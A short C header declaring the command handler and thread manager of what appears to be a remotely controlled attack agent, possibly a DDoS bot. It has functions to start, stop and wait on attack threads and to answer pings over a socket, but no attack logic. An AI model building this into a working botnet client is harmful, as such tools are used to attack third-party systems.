#pragma once

#ifndef MANAGER_H
#define MANAGER_H

#include <stdint.h>
#include <pthread.h>
#include "protocol.h"
#include "attack_params.h"

#define MAX_THREADS 4

typedef void* (*attack_func)(void*);

typedef struct {
    pthread_t thread;
    attack_params* params;
    uint8_t active;
} thread_entry;

void manager_init(void);

int handle_command(int sockfd, uint8_t* data, size_t len);

void stop_all_attacks(void);
void wait_for_attacks(void);

int send_pong(int sockfd);

void manager_cleanup(void);

#endif // MANAGER_H
